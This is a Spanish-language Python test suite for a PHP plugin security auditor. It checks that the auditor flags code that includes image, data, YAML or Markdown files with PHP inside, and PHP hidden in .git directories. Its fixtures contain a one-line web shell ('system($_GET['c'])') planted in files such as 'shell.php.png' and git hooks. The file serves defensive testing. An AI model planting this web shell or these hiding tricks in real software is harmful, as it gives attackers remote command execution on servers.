    """PHP ejecuta entero lo que incluye, sea cual sea su extensión y esté donde esté el bloque.

    Cada fixture se ha comprobado con ``php -n``: el include ejecuta su PHP.
    """

    PAYLOAD = b"cabecera\n<?= system($_GET['c']) ?>\n"

    def setUp(self) -> None:
        """Prepara un directorio temporal para cada prueba."""
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)

    def tearDown(self) -> None:
        """Elimina el directorio temporal."""
        self.tmp.cleanup()

    def plugin(self, relative: str, content: bytes) -> Path:
        """Crea un plugin con un archivo y un Init.php que lo incluye por ruta fija."""
        plugin = build_plugin(self.root, {'Init.php': init_que_incluye(relative)})
        path = plugin / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(content)
        return plugin

    def run_main(self, plugin: Path) -> tuple[int, str]:
        """Ejecuta el script sobre un plugin y devuelve su código de salida y su salida."""
        output = io.StringIO()
        with redirect_stdout(output):
            code = CHECKER.main([str(plugin)])
        return code, output.getvalue()

    def assert_include_senalado(self, relative: str, content: bytes) -> None:
        """El include del archivo da un hallazgo media y el script sale con 1."""
        plugin = self.plugin(relative, content)
        report = CHECKER.audit(plugin)
        found = [item for item in report['hallazgos']
                 if item['titulo'] == INCLUDE_TITLE]
        self.assertEqual(1, len(found), report['hallazgos'])
        self.assertEqual(('media', 'Init.php'), (found[0]['severidad'], found[0]['archivo']))
        self.assertIn(f'/{relative}', ' '.join(found[0]['notas']))
        self.assertEqual(1, self.run_main(plugin)[0])

    def test_png_que_es_texto(self) -> None:
        """Un .png que en realidad es texto con <?= se ejecuta si se incluye."""
        self.assert_include_senalado('Assets/Images/pngtext.png', self.PAYLOAD)

    def test_png_en_mayusculas(self) -> None:
        """La extensión se compara sin distinguir mayúsculas."""
        self.assert_include_senalado('Assets/Images/LOGO.PNG', self.PAYLOAD)

    def test_doble_extension(self) -> None:
        """shell.php.png no es PHP para el servidor, pero un include lo ejecuta."""
        self.assert_include_senalado('Assets/Images/shell.php.png', self.PAYLOAD)

    def test_binario_por_nul(self) -> None:
        """Un NUL hace binario el archivo, pero el <?= de después se ejecuta si se incluye."""
        self.assert_include_senalado('Lib/datos.dat', b'\0' + self.PAYLOAD)

    def test_binario_sin_extension(self) -> None:
        """Lo mismo sin extensión."""
        self.assert_include_senalado('Lib/datos', b'\0' + self.PAYLOAD)

    def test_yml_con_php_a_mitad(self) -> None:
        """El PHP a mitad de un .yml no se analiza, pero se ejecuta si se incluye."""
        self.assert_include_senalado('config/ymlmid.yml', b'clave: valor\n' + self.PAYLOAD)

    def test_md_con_php_a_mitad(self) -> None:
        """El PHP a mitad de un .md no se analiza, pero se ejecuta si se incluye."""
        self.assert_include_senalado('Doc/mdmid.md', b'# Titulo\n' + self.PAYLOAD)

    def test_include_de_php_no_se_senala(self) -> None:
        """Control: el include de un .php no es este hallazgo."""
        plugin = self.plugin('Lib/helper.php', b'<?php\nreturn 1;\n')
        titles = [item['titulo'] for item in CHECKER.audit(plugin)['hallazgos']]
        self.assertNotIn(INCLUDE_TITLE, titles)

    def test_extension_php_en_mayusculas_no_se_senala(self) -> None:
        """Control: .INC es una extensión PHP aunque vaya en mayúsculas."""
        plugin = self.plugin('Lib/helper.INC', b'<?php\nreturn 1;\n')
        titles = [item['titulo'] for item in CHECKER.audit(plugin)['hallazgos']]
        self.assertNotIn(INCLUDE_TITLE, titles)

    def assert_sentencia_senalada(self, statement: str) -> None:
        """Un include cuya ruta no sabe leer da el hallazgo media y el script sale con 1."""
        plugin = build_plugin(self.root, {'Init.php': init_con(statement)})
        (plugin / 'x.png').write_bytes(self.PAYLOAD)
        report = CHECKER.audit(plugin)
        found = [item for item in report['hallazgos'] if item['titulo'] == INCLUDE_TITLE]
        self.assertEqual(1, len(found), report['hallazgos'])
        self.assertEqual('media', found[0]['severidad'])
        self.assertEqual(1, self.run_main(plugin)[0])

    def test_coalescencia_tras_el_literal(self) -> None:
        """El último literal de la sentencia no es la ruta: ('' ?? 'a.php') vale ''."""
        self.assert_sentencia_senalada("include __DIR__ . '/x.png' . ('' ?? 'a.php');")

    def test_llamada_tras_el_literal(self) -> None:
        """substr('a.php', 5) vale '': la ruta es x.png."""
        self.assert_sentencia_senalada("include __DIR__ . '/x.png' . substr('a.php', 5);")

    def test_cierre_de_php_termina_la_sentencia(self) -> None:
        """?> termina el include: lo que sigue ya no forma parte de la ruta."""
        self.assert_sentencia_senalada("include __DIR__ . '/x.png' ?><?php echo 'a.php';")

    def test_cola_tras_un_php(self) -> None:
        """La ruta es '/a.php' . '.png': lo que sigue al literal cambia la extensión."""
        self.assert_sentencia_senalada("include __DIR__ . '/a.php' . strtolower('.PNG');")

    def test_ruta_con_variable_no_se_duplica(self) -> None:
        """Una ruta con variables ya la señala el include dinámico: no da también este hallazgo."""
        plugin = build_plugin(self.root, {'Init.php': init_con("include __DIR__ . '/' . $pagina;")})
        titles = [item['titulo'] for item in CHECKER.audit(plugin)['hallazgos']]
        self.assertIn('Incluye un archivo PHP calculado en tiempo de ejecución', titles)
        self.assertNotIn(INCLUDE_TITLE, titles)

    def test_heredoc(self) -> None:
        """Una ruta en un heredoc no es una forma que sepa leer."""
        self.assert_sentencia_senalada("include <<<EOT\nx.png\nEOT;")

    def test_rutas_fijas_de_php_no_se_senalan(self) -> None:
        """Control: las formas fijas habituales de incluir un .php no dan el hallazgo."""
        for statement in ("require_once __DIR__ . '/vendor/autoload.php';",
                          "require_once(__DIR__ . '/a.php');",
                          "include FS_FOLDER . DIRECTORY_SEPARATOR . 'a.php';",
                          'include dirname(__FILE__) . "/a.php";',
                          "include __DIR__ . '/a' . '.php';",
                          "include 'a.php' ?>"):
            with self.subTest(statement=statement):
                plugin = build_plugin(self.root, {'Init.php': init_con(statement)})
                titles = [item['titulo'] for item in CHECKER.audit(plugin)['hallazgos']]
                self.assertNotIn(INCLUDE_TITLE, titles)

    def assert_no_se_cuelga(self, relative: str) -> None:
        """El script termina aunque el plugin tenga un FIFO, que se abriría y no devolvería nada."""
        plugin = build_plugin(self.root, {})
        fifo = plugin / relative
        fifo.parent.mkdir(parents=True, exist_ok=True)
        os.mkfifo(fifo)
        try:
            result = subprocess.run([sys.executable, str(SCRIPT_PATH), str(plugin)],
                                    capture_output=True, text=True, timeout=10)
        except subprocess.TimeoutExpired:
            self.fail(f'el script se cuelga con un FIFO en {relative}')
        self.assertEqual(0, result.returncode, result.stdout + result.stderr)

    @unittest.skipUnless(hasattr(os, 'mkfifo'), 'el sistema no tiene FIFO')
    def test_fifo_en_git(self) -> None:
        """Un FIFO dentro de .git no cuelga el examen de .git."""
        self.assert_no_se_cuelga('.git/hooks/fifo')

    @unittest.skipUnless(hasattr(os, 'mkfifo'), 'el sistema no tiene FIFO')
    def test_fifo_de_extension_desconocida(self) -> None:
        """Un FIFO de extensión desconocida no cuelga la lectura del plugin."""
        self.assert_no_se_cuelga('Lib/fifo')

    def assert_git_declarado(self, relative: str, content: bytes) -> None:
        """Un .git con PHP se declara sin analizar, y el veredicto no da el plugin por limpio."""
        plugin = self.plugin(relative, content)
        report = CHECKER.audit(plugin)
        git_dir = relative[:relative.index('.git') + 4]
        self.assertIn(f'{git_dir}/ es un repositorio git que contiene PHP y no se ha analizado.',
                      report['limitaciones'])
        self.assertEqual(1, report['analizados']['sin_analizar'])
        self.assertNotIn('SIN HALLAZGOS RELEVANTES', self.run_main(plugin)[1])

    def test_php_en_hooks_de_git(self) -> None:
        """Un .php en .git/hooks/ se ejecuta si se incluye."""
        self.assert_git_declarado('.git/hooks/x.php', b"<?php system($_GET['c']);\n")

    def test_php_en_git_anidado(self) -> None:
        """También en un .git que no está en la raíz."""
        self.assert_git_declarado('Lib/.git/x.php', b"<?php system($_GET['c']);\n")

    def test_php_binario_en_git(self) -> None:
        """Un .php de .git cuenta por su extensión, aunque su contenido parezca binario."""
        self.assert_git_declarado('.git/x.php', b'\0' + self.PAYLOAD)

    def test_texto_con_php_en_git(self) -> None:
        """Un archivo de texto de .git con PHP dentro cuenta, aunque no tenga extensión PHP."""
        self.assert_git_declarado('.git/hooks/post-merge', b'#!/usr/bin/env php\n' + self.PAYLOAD)

    def test_clon_normal_sale_limpio(self) -> None:
        """Un .git de verdad, con objetos comprimidos que tienen <?= por azar, no se declara."""
        plugin = build_plugin(self.root, {'.git/config': '[core]\n', '.git/HEAD': 'ref: refs/heads/main\n',
                                          '.git/hooks/pre-commit.sample': '#!/bin/sh\nexit 0\n'})
        (plugin / '.git/objects/pack').mkdir(parents=True)
        (plugin / '.git/objects/pack/pack-1.pack').write_bytes(b'PACK\0\0\0\2' + b'\x9c<?=\xff' * 50)
        report = CHECKER.audit(plugin)
        self.assertEqual(0, report['analizados']['sin_analizar'], report['limitaciones'])
        code, output = self.run_main(plugin)
        self.assertEqual(0, code)
        self.assertIn('SIN HALLAZGOS RELEVANTES', output)


if __name__ == '__main__':
    unittest.main()
